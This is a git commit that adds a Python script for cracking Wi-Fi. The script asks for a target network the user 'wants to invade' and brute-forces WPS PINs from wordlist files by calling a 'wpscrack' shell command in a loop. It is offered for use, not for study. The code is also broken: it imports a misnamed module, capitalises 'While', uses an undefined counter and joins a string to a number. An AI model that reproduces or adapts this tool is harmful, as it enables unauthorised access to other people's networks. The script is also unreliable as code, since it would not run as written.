07e3e8ba6ff7b63a7a9cf30f7600130911f37197
Wolf404 <96954406+WBs234@users.noreply.github.com>
2023-06-13 06:02:37 -0300

    Create Script.py

---
+++ Script.py
@@ -0,0 +1,44 @@
+
+import netifaces
+import subprocesses
+
+def get_wifi_interface():
+    interfaces = netifaces.interfaces()
+    for interface in interfaces:
+        if "wlan" in interface:
+            return interface
+    return None
+
+wifi_interface = get_wifi_interface()
+
+if wifi_interface:
+    print(f"Nome da interface Wi-Fi: {wifi_interface}")
+else:
+    print("Nenhuma interface Wi-Fi encontrada.")
+
+While True:
+    n=n+1
+
+    wifi_interface = input("Qual o nome da sua interface Wifi? ")
+    ssid = input("Qual o nome da rede que deseja invadir?")
+    pins_file = "wordlistofc"+n+".txt"
+    def connect_wifi(pin):
+        command = f"wpscrack -i {wifi_interface} -s {ssid} -p {pin}"
+        output = subprocess.run(command, shell=True, capture_output=True, text=True)
+        return output.stdout
+
+    def main():
+        with open(pins_file, "r") as file:
+            pins = file.readlines()
+            for pin in pins:
+                pin = pin.strip()
+                print(f"Testing PIN: {pin}")
+                result = connect_wifi(pin)
+                if "SUCCESS" in result:
+                    print(f"Success! PIN found: {pin}")
+                    exit()
+                else:
+                    print("PIN not found")
+
+    if __name__ == "__main__":
+        main()
